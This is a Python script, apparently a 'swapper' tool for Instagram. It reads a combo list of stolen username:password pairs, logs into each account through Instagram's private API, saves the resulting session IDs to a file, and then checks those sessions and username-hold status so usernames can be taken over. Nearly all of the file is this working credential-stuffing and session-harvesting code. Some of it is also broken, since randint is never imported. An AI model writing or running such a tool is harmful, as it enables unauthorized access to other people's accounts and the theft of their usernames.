import time, subprocess
try:
    import requests
except ModuleNotFoundError:
    subprocess.run(['cmd', '/c','pip', 'install', 'requests'])
    import requests

def main():
    print('swapper utility tool')
    time.sleep(2)
    print('press 1 for 14d check\npress 2 for session id grab\npress 3 for rl check')
    option = input("?: ")
    if option == "1":
        username = input('enter username to check: ')
        session = input('enter session to check: ')
    
        api = "https://i.instagram.com/api/v1/accounts/current_user/?edit=true"
        headers = {
        "user-agent": "Instagram 10.3.2 Android",
        "cookie": f"sessionid={session}",
        "content-type": "application/x-www-form-urlencoded"
        }
        response = requests.get(api, headers=headers)
        if response.status_code == 200:
            try:
                if str(response.json()["user"]["trusted_username"]) == username:
                    print(f"not swappable, current 14d: {str(response.json()['user']['trusted_username'])}")
                else:
                    print(f"swappable, current 14d: {str(response.json()['user']['trusted_username'])}")
            except:
                print(f"swappable, no 14d")
        else:
            print(f"Bad request was made. Status Code: {response.status_code}")
        time.sleep(5)
        main()
    elif option == "2":
        session_file = input("enter combo list file path: ")
        opened_session_file = open(session_file, "r").readlines()
        session_id_list = []
        for line in opened_session_file:
            url = "https://i.instagram.com/api/v1/accounts/login/"
            payload = {
                'username': line.rstrip().split(':')[0],
                'device_id': f'android-JDS{randint(568585755, 98569678438747865595)}',
                'password': line.rstrip().split(':')[1]
            }
            headers = {
                'Accept': '/',
                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Language': 'en-US',
                'User-Agent': "Instagram 85.0.0.21.100 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)"
            }
            response = requests.post(url, headers=headers, data=payload)
            if response.status_code == 200:
                session_id_list.append(str(response.cookies.get_dict()['sessionid']))
                print(f'sessions grabbed {len(session_id_list)}', end='\r')
            time.sleep(8)
        writer = open(f"sessions {int(time.time())}.txt", "a")
        for id in session_id_list:
            writer.write(f"{id}\n")
        print('finished')
        time.sleep(7)
        main()
    elif option == "3":
        session_file = input('enter session file path name: ')
        opened_session_file = open(session_file, "r").readlines()
        session_id_list = []
        failure_count = 0
        success_count = 0
        for session in opened_session_file:
            headers = {
                'user-agent': 'Instagram 85.0.0.21.100 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': f'sessionid={session.rstrip()}'
            }
            response = requests.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers=headers)
            try:
                url = "https://i.instagram.com/api/v1/accounts/set_username/"
                payload = {
                    "username": str(response.json()["user"]["username"]),
                }
                headers = {
                    "user-agent": "Instagram 85.0.0.21.100 Android (28/9; 380dpi; 1080x2147; OnePlus; HWEVA; OnePlus6T; qcom; en_US; 146536611)",
                    "content-type": "application/x-www-form-urlencoded",
                    "cookie": f"sessionid={session.rstrip()}",
                }
                response = requests.post(url, data=payload, headers=headers)
                if response.status_code == 200:
                    session_id_list.append(session.rstrip())
                    success_count += 1
                    print(f'success count = {success_count}')
                else:
                    failure_count += 1
                    print(f'failure count = {failure_count}')
            except:
                failure_count += 1
                print(f'failure count = {failure_count}')
            time.sleep(6)
        print('finished')
        time.sleep(3)
        print('would you like a file with all the good sessions? [Y/N]')
        want = input('?: ')
        if want.upper() == 'Y':
            writer = open(f'sessions {int(time.time())}.txt', "a")
            for session in session_id_list:
                writer.write(f'{session}\n')
            print('finished')
            time.sleep(5)
            main()
        else:
            time.sleep(5)
            main()
    else:
        time.sleep(5)
        main()
main()
        

            
        
